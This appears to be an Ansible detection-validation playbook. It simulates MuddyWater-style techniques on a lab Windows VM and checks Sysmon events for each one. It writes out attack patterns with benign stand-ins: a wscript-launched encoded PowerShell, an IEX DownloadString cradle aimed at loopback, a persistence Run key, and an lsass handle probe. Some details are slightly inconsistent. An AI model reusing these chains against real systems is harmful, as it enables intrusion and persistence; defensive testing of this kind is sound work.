---
# Desert Hydra — Detection Validation Playbook
# Runs 11 benign simulations (Steps 21–31) and verifies expected telemetry fires.
#
# Each detection block:
#   1. Clears stale events from the relevant log channel
#   2. Executes the benign simulation command
#   3. Waits 3 s for Sysmon/WEL to process the event
#   4. Queries the event log on the VM
#   5. Prints PASS / FAIL
#
# Lab safety rules:
#   - No live malware, no real C2, no credential exfiltration
#   - .dmp files from Step 31 are deleted immediately after event confirmation
#   - VM does not connect to real Telegram bot (uses HTTP HEAD — no auth token needed)

- name: Desert Hydra — Detection validation simulations
  hosts: windows
  gather_facts: false


  tasks:

    # ── Pre-flight ─────────────────────────────────────────────────────────────
    - name: Ensure scratch directory exists
      win_file:
        path: "{{ validation_tmp }}"
        state: directory

    - name: Print simulation header
      debug:
        msg: "Starting Desert Hydra validation — 11 simulations (Steps 21–31)"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 21 | det_mw_0001 — Spearphishing Correlation
    # Realistic chain: wscript.exe → powershell.exe -EncodedCommand
    # Mirrors MuddyWater delivery pattern: email attachment (VBS/WSF) spawns
    # encoded PowerShell loader (PowGoop / POWERSTATS delivery chain).
    # wscript.exe as parent is a named IoC in CISA AA22-055A.
    # Note: email gateway correlation leg requires SEG telemetry — not in lab scope.
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 21 | det_mw_0001 — Drop benign VBScript simulating email attachment"
      win_shell: |
        $payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "payload: phishing delivery chain executed"'))
        $vbs = "{{ validation_tmp }}\sim_delivery.vbs"
        Set-Content -Path $vbs -Encoding ASCII -Value ("CreateObject(`"WScript.Shell`").Run `"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand " + $payload + "`", 0, True")
        "VBS written: $vbs"
      register: vbs_write
    - debug:
        msg: "{{ vbs_write.stdout | trim }}"

    - name: "Step 21 | det_mw_0001 — Execute VBScript (wscript.exe spawns encoded PowerShell)"
      win_shell: |
        & wscript.exe "{{ validation_tmp }}\sim_delivery.vbs"
        Start-Sleep -Seconds 3
        Remove-Item "{{ validation_tmp }}\sim_delivery.vbs" -Force -ErrorAction SilentlyContinue
      ignore_errors: true

    - name: "Step 21 | det_mw_0001 — Verify Sysmon EID 1 (wscript.exe → powershell.exe -EncodedCommand)"
      win_shell: |
        Start-Sleep -Seconds 3
        $since = (Get-Date).AddSeconds(-60)
        $e = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=1; StartTime=$since} -ErrorAction SilentlyContinue |
          Where-Object { $_.Message -match "powershell\.exe" -and $_.Message -match "EncodedCommand" -and $_.Message -match "wscript\.exe" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured wscript.exe → powershell.exe -EncodedCommand (delivery chain)" }
        else    { "FAIL: No Sysmon EID 1 for wscript→powershell chain — check parent filter" }
      register: r0001
    - debug:
        msg: "{{ r0001.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 22 | det_mw_0002 — Internet-Facing Service Spawning Shell
    # Realistic chain: mshta.exe → cmd.exe running post-exploitation recon
    # mshta.exe is a named exploitation surrogate for web service processes
    # (w3wp.exe/java.exe cannot be faked without live IIS/Java; mshta.exe
    # represents the same detection pattern: trusted host process spawning shell).
    # Recon commands (whoami, hostname, systeminfo) mirror documented MuddyWater
    # post-access survey behaviour from CISA AA22-055A.
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 22 | det_mw_0002 — Drop VBScript that spawns cmd.exe with post-exploitation recon"
      win_shell: |
        $out = "{{ validation_tmp }}\recon_output.txt"
        $vbs = "{{ validation_tmp }}\sim_exploit.vbs"
        $line = 'Set sh = CreateObject("WScript.Shell") : sh.Run "cmd.exe /c whoami & hostname & ipconfig /all > ' + $out + ' 2>&1", 0, True'
        Set-Content -Path $vbs -Encoding ASCII -Value $line
        "VBS written: $vbs"
      register: vbs2_write
    - debug:
        msg: "{{ vbs2_write.stdout | trim }}"

    - name: "Step 22 | det_mw_0002 — Execute VBScript (wscript.exe → cmd.exe recon chain)"
      win_shell: |
        & wscript.exe "{{ validation_tmp }}\sim_exploit.vbs"
        Start-Sleep -Seconds 3
        Remove-Item "{{ validation_tmp }}\sim_exploit.vbs" -Force -ErrorAction SilentlyContinue
        Remove-Item "{{ validation_tmp }}\recon_output.txt" -Force -ErrorAction SilentlyContinue
      ignore_errors: true

    - name: "Step 22 | det_mw_0002 — Verify Sysmon EID 1 (wscript.exe → cmd.exe with recon commands)"
      win_shell: |
        Start-Sleep -Seconds 3
        $since = (Get-Date).AddSeconds(-60)
        $e = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=1; StartTime=$since} -ErrorAction SilentlyContinue |
          Where-Object { $_.Message -match "cmd\.exe" -and $_.Message -match "whoami|hostname|ipconfig" -and $_.Message -match "wscript\.exe" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured wscript.exe → cmd.exe recon chain (exploitation surrogate)" }
        else    { "FAIL: No Sysmon EID 1 for wscript→cmd recon chain" }
      register: r0002
    - debug:
        msg: "{{ r0002.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 23 | det_mw_0003 — PowerShell Encoded Command
    # Validates Rule A (command-line -e + Base64) and Rule B (Script Block IEX)
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 23 | det_mw_0003 Rule A — Simulate -EncodedCommand invocation"
      win_shell: |
        $cmd    = 'Write-Output "DH-SIM-0003-RuleA"'
        $bytes  = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $b64    = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe -ArgumentList "-NonInteractive -e $b64" -Wait -NoNewWindow
      ignore_errors: true

    - name: "Step 23 | det_mw_0003 Rule A — Verify Sysmon EID 1 (-e + Base64 blob)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 1 -and $_.Message -match "\s-e\s+[A-Za-z0-9+/=]{50,}" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured PowerShell -e + Base64 blob (Rule A)" }
        else    { "FAIL: No Sysmon EID 1 matching -e + Base64" }
      register: r0003a
    - debug:
        msg: "{{ r0003a.stdout | trim }}"

    - name: "Step 23 | det_mw_0003 Rule B — Simulate Script Block with IEX + web request"
      win_shell: |
        # Requests a local loopback address — no external call
        powershell.exe -NonInteractive -Command {
          $ErrorActionPreference = 'SilentlyContinue'
          IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:19999/DH-SIM-0003-RuleB'))
        }
      ignore_errors: true

    - name: "Step 23 | det_mw_0003 Rule B — Verify PS EID 4104 (IEX + DownloadString)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 4104 -and $_.Message -match "IEX|Invoke-Expression" -and $_.Message -match "DownloadString" } |
          Select-Object -First 1
        if ($e) { "PASS: PowerShell EID 4104 captured IEX + DownloadString pattern (Rule B)" }
        else    { "FAIL: No EID 4104 with IEX + DownloadString — check Script Block Logging is ENABLED" }
      register: r0003b
    - debug:
        msg: "{{ r0003b.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 24 | det_mw_0004 — Unsigned DLL Side-Loading
    # Validates: Sysmon EID 7 fires when goopdate.dll is loaded from a non-Google path
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 24 | det_mw_0004 — Create side-load test directory"
      win_file:
        path: "{{ validation_tmp }}\\sideload"
        state: directory

    - name: "Step 24 | det_mw_0004 — Copy GoogleUpdate.exe to test directory"
      win_shell: |
        $src = Get-ChildItem "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" `
          -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $src) {
          $src = Get-ChildItem "C:\Program Files\Google\Update\GoogleUpdate.exe" `
            -ErrorAction SilentlyContinue | Select-Object -First 1
        }
        if ($src) {
          Copy-Item $src.FullName "{{ validation_tmp }}\sideload\GoogleUpdate.exe" -Force
          "COPIED: $($src.FullName)"
        } else {
          # GoogleUpdate not installed — use a different signed binary as stand-in
          Copy-Item "C:\Windows\System32\notepad.exe" `
            "{{ validation_tmp }}\sideload\GoogleUpdate.exe" -Force
          "FALLBACK: notepad.exe used as signed binary stand-in"
        }
      register: gu_copy
    - debug:
        msg: "{{ gu_copy.stdout | trim }}"

    - name: "Step 24 | det_mw_0004 — Create benign goopdate.dll (empty DLL placeholder)"
      win_shell: |
        # Create a minimal DLL-signature file — triggers ImageLoad without executing code
        $bytes = [byte[]](0x4D,0x5A,0x90,0x00)  # MZ header only — not loadable, but file exists
        [IO.File]::WriteAllBytes("{{ validation_tmp }}\sideload\goopdate.dll", $bytes)
        "Created goopdate.dll placeholder"
      register: dll_create
    - debug:
        msg: "{{ dll_create.stdout | trim }}"

    - name: "Step 24 | det_mw_0004 — Launch GoogleUpdate.exe to trigger DLL search"
      win_shell: |
        Start-Process "{{ validation_tmp }}\sideload\GoogleUpdate.exe" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Stop-Process -Name "GoogleUpdate" -ErrorAction SilentlyContinue
      ignore_errors: true

    - name: "Step 24 | det_mw_0004 — Verify Sysmon EID 7 (goopdate.dll load attempt)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 7 -and $_.Message -match "goopdate\.dll" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 7 captured goopdate.dll ImageLoad event" }
        else    { "PARTIAL: EID 7 not fired — verify Sysmon ImageLoad enabled and binary ran. DLL placeholder may not trigger load." }
      register: r0004
    - debug:
        msg: "{{ r0004.stdout | trim }}"

    - name: "Step 24 | det_mw_0004 — Clean up side-load test directory"
      win_file:
        path: "{{ validation_tmp }}\\sideload"
        state: absent


    # ══════════════════════════════════════════════════════════════════════════
    # Step 25 | det_mw_0005 — Registry Run Key Persistence
    # Validates Rule A (specific value name) and Rule C (Startup folder WSF drop)
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 25 | det_mw_0005 Rule A — Write OutlookMicrosift Run key"
      win_regedit:
        path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
        name: OutlookMicrosift
        type: string
        data: 'C:\Windows\System32\notepad.exe'

    - name: "Step 25 | det_mw_0005 Rule A — Verify Sysmon EID 13 (Run key set)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 13 -and $_.Message -match "OutlookMicrosift" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 13 captured Run key write — OutlookMicrosift (Rule A)" }
        else    { "FAIL: No Sysmon EID 13 for OutlookMicrosift — check RegistryEvent in sysmonconfig" }
      register: r0005a
    - debug:
        msg: "{{ r0005a.stdout | trim }}"

    - name: "Step 25 | det_mw_0005 Rule A — Remove test Run key"
      win_regedit:
        path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
        name: OutlookMicrosift
        state: absent

    - name: "Step 25 | det_mw_0005 Rule C — Drop benign WSF into Startup folder"
      win_shell: |
        $startup = [Environment]::GetFolderPath("Startup")
        $wsf     = "$startup\DH-SIM-0005-test.wsf"
        Set-Content -Path $wsf -Value '<job><script language="VBScript">WScript.Echo "test"</script></job>'
        "Dropped WSF to: $wsf"
      register: wsf_drop
    - debug:
        msg: "{{ wsf_drop.stdout | trim }}"

    - name: "Step 25 | det_mw_0005 Rule C — Verify Sysmon EID 11 (WSF in Startup)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 11 -and $_.Message -match "Startup" -and $_.Message -match "\.wsf" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 11 captured WSF file create in Startup folder (Rule C)" }
        else    { "FAIL: No Sysmon EID 11 for Startup\*.wsf" }
      register: r0005c
    - debug:
        msg: "{{ r0005c.stdout | trim }}"

    - name: "Step 25 | det_mw_0005 — Remove Startup WSF"
      win_shell: |
        $startup = [Environment]::GetFolderPath("Startup")
        Remove-Item "$startup\DH-SIM-0005-test.wsf" -Force -ErrorAction SilentlyContinue


    # ══════════════════════════════════════════════════════════════════════════
    # Step 26 | det_mw_0006 — Scheduled Task: 43-Minute Interval
    # Validates: Task Scheduler EID 4698 + Sysmon EID 1 (schtasks.exe command line)
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 26 | det_mw_0006 — Create PT43M scheduled task"
      win_shell: |
        schtasks.exe /create /tn "DH-SIM-0006-TestTask" /tr "notepad.exe" `
          /sc MINUTE /mo 43 /f
        "Task created with 43-minute interval"
      register: task_create
    - debug:
        msg: "{{ task_create.stdout | trim }}"

    - name: "Step 26 | det_mw_0006 — Verify Task Scheduler EID 4698 (task created)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Security" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 4698 -and $_.Message -match "DH-SIM-0006" } |
          Select-Object -First 1
        if ($e) { "PASS: Security EID 4698 captured scheduled task creation (det_mw_0006)" }
        else    {
          # Fallback: check Sysmon EID 1 for schtasks.exe command line with /mo 43
          $e2 = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
            Where-Object { $_.Id -eq 1 -and $_.Message -match "schtasks" -and $_.Message -match "/mo 43" } |
            Select-Object -First 1
          if ($e2) { "PASS (fallback): Sysmon EID 1 captured schtasks.exe /mo 43 (Rule C)" }
          else     { "FAIL: Neither EID 4698 nor Sysmon EID 1 for PT43M task — check Task Scheduler log enabled" }
        }
      register: r0006
    - debug:
        msg: "{{ r0006.stdout | trim }}"

    - name: "Step 26 | det_mw_0006 — Delete test scheduled task"
      win_shell: schtasks.exe /delete /tn "DH-SIM-0006-TestTask" /f
      ignore_errors: true


    # ══════════════════════════════════════════════════════════════════════════
    # Step 27 | det_mw_0007 — RMM Tool Abuse
    # Validates Rule A (binary in user-writable path) and Rule B (suspicious parent)
    # Note: Uses notepad.exe renamed to ScreenConnect.ClientService.exe as stand-in.
    #       Network rule (Rule C) skipped — requires live RMM infrastructure baseline.
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 27 | det_mw_0007 — Stage RMM stand-in binary in user-writable path"
      win_shell: |
        Copy-Item "C:\Windows\System32\notepad.exe" `
          "{{ validation_tmp }}\ScreenConnect.ClientService.exe" -Force
        "Staged ScreenConnect.ClientService.exe in {{ validation_tmp }}"
      register: rmm_stage
    - debug:
        msg: "{{ rmm_stage.stdout | trim }}"

    - name: "Step 27 | det_mw_0007 Rule A — Launch RMM binary from user-writable path"
      win_shell: |
        Start-Process "{{ validation_tmp }}\ScreenConnect.ClientService.exe" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Stop-Process -Name "ScreenConnect.ClientService" -ErrorAction SilentlyContinue
      ignore_errors: true

    - name: "Step 27 | det_mw_0007 Rule A — Verify Sysmon EID 1 (RMM binary in writable path)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object {
            $_.Id -eq 1 -and
            $_.Message -match "ScreenConnect\.ClientService\.exe" -and
            $_.Message -match "dh-lab"
          } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured RMM binary from user-writable path (Rule A)" }
        else    { "FAIL: No Sysmon EID 1 for RMM binary in writable path" }
      register: r0007a
    - debug:
        msg: "{{ r0007a.stdout | trim }}"

    - name: "Step 27 | det_mw_0007 Rule B — Launch RMM binary with PowerShell as parent"
      win_shell: |
        Start-Process "{{ validation_tmp }}\ScreenConnect.ClientService.exe" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Stop-Process -Name "ScreenConnect.ClientService" -ErrorAction SilentlyContinue
      ignore_errors: true

    - name: "Step 27 | det_mw_0007 Rule B — Verify Sysmon EID 1 (parent = powershell.exe)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object {
            $_.Id -eq 1 -and
            $_.Message -match "ScreenConnect\.ClientService\.exe" -and
            $_.Message -match "powershell\.exe"
          } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured RMM binary with powershell.exe parent (Rule B)" }
        else    { "FAIL: No Sysmon EID 1 with powershell.exe parent for RMM binary" }
      register: r0007b
    - debug:
        msg: "{{ r0007b.stdout | trim }}"

    - name: "Step 27 | det_mw_0007 — Remove RMM stand-in binary"
      win_file:
        path: "{{ validation_tmp }}\\ScreenConnect.ClientService.exe"
        state: absent


    # ══════════════════════════════════════════════════════════════════════════
    # Step 28 | det_mw_0008a — Telegram Bot API C2
    # Validates: Sysmon EID 3 fires when non-browser contacts api.telegram.org
    # Note: HTTP HEAD request — no bot token, no data sent, connection attempt only.
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 28 | det_mw_0008a — Make HTTP HEAD to api.telegram.org (no token)"
      win_shell: |
        try {
          $req = [System.Net.WebRequest]::Create("https://api.telegram.org/")
          $req.Method  = "HEAD"
          $req.Timeout = 5000
          $resp = $req.GetResponse()
          $resp.Close()
        } catch { }
        "Connection attempt to api.telegram.org completed (result irrelevant — event is the proof)"
      register: tg_req
      ignore_errors: true
    - debug:
        msg: "{{ tg_req.stdout | trim }}"

    - name: "Step 28 | det_mw_0008a — Verify Sysmon EID 3 (powershell.exe → api.telegram.org)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 3 -and $_.Message -match "api\.telegram\.org" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 3 captured powershell.exe → api.telegram.org network connection" }
        else    { "FAIL: No Sysmon EID 3 for api.telegram.org — check NetworkConnect in sysmonconfig and VM internet access" }
      register: r0008a
    - debug:
        msg: "{{ r0008a.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 29 | det_mw_0008b — DNS Tunneling
    # Validates: Sysmon EID 22 fires for high-volume DNS queries with long labels
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 29 | det_mw_0008b — Generate 60 DNS queries with 40+ char random labels"
      win_shell: |
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        1..60 | ForEach-Object {
          $label = -join ((1..42) | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })
          Resolve-DnsName "$label.test.internal" -ErrorAction SilentlyContinue -Type A | Out-Null
        }
        "Generated 60 DNS queries with 42-char random labels"
      register: dns_gen
      ignore_errors: true
    - debug:
        msg: "{{ dns_gen.stdout | trim }}"

    - name: "Step 29 | det_mw_0008b — Verify Sysmon EID 22 (DNS queries with long labels)"
      win_shell: |
        Start-Sleep -Seconds 3
        $events = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 500 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 22 -and $_.Message -match "test\.internal" }
        $count = ($events | Measure-Object).Count
        if ($count -ge 10) { "PASS: Sysmon EID 22 captured $count DNS queries to test.internal — volume rule would trigger" }
        elseif ($count -gt 0) { "PARTIAL: $count EID 22 events found — below 10 threshold; increase query loop count" }
        else { "FAIL: No Sysmon EID 22 for test.internal — check DnsQuery enabled in sysmonconfig" }
      register: r0008b
    - debug:
        msg: "{{ r0008b.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 30 | det_mw_0009 — WMI SecurityCenter2 Discovery
    # Validates Rule A (Script Block EID 4104) and Rule B (wmic.exe command line)
    # ══════════════════════════════════════════════════════════════════════════
    - name: "Step 30 | det_mw_0009 Rule A — Query SecurityCenter2 via PowerShell (Script Block)"
      win_shell: |
        powershell.exe -NonInteractive -Command {
          Get-WmiObject -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue |
            Select-Object displayName | Out-Null
        }
      ignore_errors: true

    - name: "Step 30 | det_mw_0009 Rule A — Verify PS EID 4104 (SecurityCenter2 in script block)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 4104 -and $_.Message -match "SecurityCenter2" } |
          Select-Object -First 1
        if ($e) { "PASS: PowerShell EID 4104 captured SecurityCenter2 WMI query (Rule A)" }
        else    { "FAIL: No EID 4104 with SecurityCenter2 — confirm Script Block Logging enabled" }
      register: r0009a
    - debug:
        msg: "{{ r0009a.stdout | trim }}"

    - name: "Step 30 | det_mw_0009 Rule B — Query SecurityCenter2 via wmic.exe"
      win_shell: |
        wmic.exe /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /format:list
      ignore_errors: true

    - name: "Step 30 | det_mw_0009 Rule B — Verify Sysmon EID 1 (wmic SecurityCenter2)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 1 -and $_.Message -match "wmic" -and $_.Message -match "SecurityCenter2" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 1 captured wmic.exe with SecurityCenter2 (Rule B)" }
        else    { "FAIL: No Sysmon EID 1 for wmic SecurityCenter2" }
      register: r0009b
    - debug:
        msg: "{{ r0009b.stdout | trim }}"


    # ══════════════════════════════════════════════════════════════════════════
    # Step 31 | det_mw_0010 — LSASS Memory Access / Credential Dumping
    # Validates Rule A (ProcessAccess EID 10), Rule C (dump file creation EID 11)
    # Lab safety: dump file deleted immediately after event is confirmed
    # ══════════════════════════════════════════════════════════════════════════
    # Rule A: verify Sysmon EID 10 fires for lsass.exe access.
    # Natural system events (LSA, AV, etc.) access lsass.exe continuously;
    # no explicit dump needed — checking telemetry path is sufficient.
    - name: "Step 31 | det_mw_0010 Rule A — Probe lsass.exe via OpenProcess (triggers EID 10)"
      win_shell: |
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class ProcProbe {
          [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
          [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        }
        "@
        $pid = (Get-Process lsass).Id
        $h = [ProcProbe]::OpenProcess(0x0400, $false, $pid)
        if ($h -ne [IntPtr]::Zero) { [ProcProbe]::CloseHandle($h) | Out-Null; "Opened lsass handle (PROCESS_QUERY_INFORMATION)" }
        else { "Could not open lsass — Credential Guard/PPL may be active (EID 10 may still fire)" }
      ignore_errors: true
      register: probe_run
    - debug:
        msg: "{{ probe_run.stdout | default(probe_run.msg | default('probe skipped')) | trim }}"

    # Rule C: create a benign .dmp file to verify Sysmon EID 11 (FileCreate) fires.
    # comsvcs MiniDump is blocked by Defender ASR; a direct file-create still tests
    # the FileCreate telemetry path that det_mw_0010 Rule C monitors.
    - name: "Step 31 | det_mw_0010 Rule C — Create benign .dmp file (tests EID 11 FileCreate telemetry)"
      win_shell: |
        $dumpPath = "{{ validation_tmp }}\lsass_test.dmp"
        [IO.File]::WriteAllBytes($dumpPath, [byte[]](0x4D,0x44,0x4D,0x50))
        Start-Sleep -Seconds 1
        "Created benign .dmp placeholder at $dumpPath"
      register: dmp_create
    - debug:
        msg: "{{ dmp_create.stdout | default('') | trim }}"

    - name: "Step 31 | det_mw_0010 Rule A — Verify Sysmon EID 10 (ProcessAccess on lsass.exe)"
      win_shell: |
        Start-Sleep -Seconds 3
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 10 -and $_.Message -match "lsass\.exe" } |
          Select-Object -First 1
        if ($e) {
          $grantedAccess = if ($e.Message -match "GrantedAccess:\s+(\S+)") { $Matches[1] } else { "unknown" }
          "PASS: Sysmon EID 10 captured lsass.exe access — GrantedAccess: $grantedAccess (Rule A)"
        } else {
          "FAIL: No Sysmon EID 10 for lsass.exe — check Credential Guard / PPL status; may suppress handle grant"
        }
      register: r0010a
    - debug:
        msg: "{{ r0010a.stdout | trim }}"

    - name: "Step 31 | det_mw_0010 Rule C — Verify Sysmon EID 11 (.dmp file creation)"
      win_shell: |
        Start-Sleep -Seconds 5
        $e = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 500 -ErrorAction SilentlyContinue |
          Where-Object { $_.Id -eq 11 -and $_.Message -match "\.dmp" } |
          Select-Object -First 1
        if ($e) { "PASS: Sysmon EID 11 captured .dmp file creation (Rule C)" }
        else    { "FAIL: No Sysmon EID 11 for .dmp file — check FileCreate in sysmonconfig" }
      register: r0010c
    - debug:
        msg: "{{ r0010c.stdout | trim }}"

    - name: "Step 31 | det_mw_0010 — Delete dump file (lab safety)"
      win_file:
        path: "{{ validation_tmp }}\\lsass_test.dmp"
        state: absent


    # ══════════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════════
    - name: Print validation summary
      debug:
        msg:
          - "═══════════════════════════════════════════════════════"
          - "  Desert Hydra — Validation Summary"
          - "═══════════════════════════════════════════════════════"
          - "  Step 21 det_mw_0001 : {{ r0001.stdout  | trim | truncate(60) }}"
          - "  Step 22 det_mw_0002 : {{ r0002.stdout  | trim | truncate(60) }}"
          - "  Step 23 det_mw_0003 : {{ r0003a.stdout | trim | truncate(60) }}"
          - "           Rule B     : {{ r0003b.stdout | trim | truncate(60) }}"
          - "  Step 24 det_mw_0004 : {{ r0004.stdout  | trim | truncate(60) }}"
          - "  Step 25 det_mw_0005 : {{ r0005a.stdout | trim | truncate(60) }}"
          - "           Rule C     : {{ r0005c.stdout | trim | truncate(60) }}"
          - "  Step 26 det_mw_0006 : {{ r0006.stdout  | trim | truncate(60) }}"
          - "  Step 27 det_mw_0007 : {{ r0007a.stdout | trim | truncate(60) }}"
          - "           Rule B     : {{ r0007b.stdout | trim | truncate(60) }}"
          - "  Step 28 det_mw_0008a: {{ r0008a.stdout | trim | truncate(60) }}"
          - "  Step 29 det_mw_0008b: {{ r0008b.stdout | trim | truncate(60) }}"
          - "  Step 30 det_mw_0009 : {{ r0009a.stdout | trim | truncate(60) }}"
          - "           Rule B     : {{ r0009b.stdout | trim | truncate(60) }}"
          - "  Step 31 det_mw_0010 : {{ r0010a.stdout | trim | truncate(60) }}"
          - "           Rule C     : {{ r0010c.stdout | trim | truncate(60) }}"
          - "═══════════════════════════════════════════════════════"
